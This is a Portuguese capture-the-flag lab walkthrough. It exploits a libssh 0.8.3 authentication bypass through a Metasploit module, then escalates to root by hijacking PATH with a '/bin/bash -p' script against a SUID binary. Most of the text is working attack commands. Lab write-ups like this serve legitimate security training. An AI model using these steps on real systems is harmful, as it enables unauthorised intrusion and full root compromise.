## Exploração SSH libssh + Privilege Escalation (PATH Hijacking)

### 1. Enumeração

nmap -sV target2.ine.local

Resultado:

22/tcp open ssh libssh 0.8.3

---

### 2. Exploração libssh auth bypass

use auxiliary/scanner/ssh/libssh_auth_bypass  
set RHOSTS target2.ine.local  
set SPAWN_PTY true  
run

Abrir sessão:

sessions -i 2

---

### 3. Buscar flags

find / -name "*flag*" 2>/dev/null

FLAG3 encontrada (user).

---

### 4. Enumeração para privilege escalation

Buscar SUID:

find / -perm -4000 -type f 2>/dev/null

Encontrado:

/home/user/welcome

---

### 5. Analisar binário

strings /home/user/welcome

Saída relevante:

setuid  
system  
greetings

Indica uso de `system()` sem caminho absoluto.

---

### 6. PATH Hijacking

Criar payload:

cd /tmp  
echo "/bin/bash -p" > greetings  
chmod +x greetings

Alterar PATH:

export PATH=/tmp:$PATH

Executar SUID:

/home/user/welcome

Shell root obtido.

---

### 7. Confirmar root

/bin/id

---

### 8. Ler flag final

/bin/cat /root/flag.txt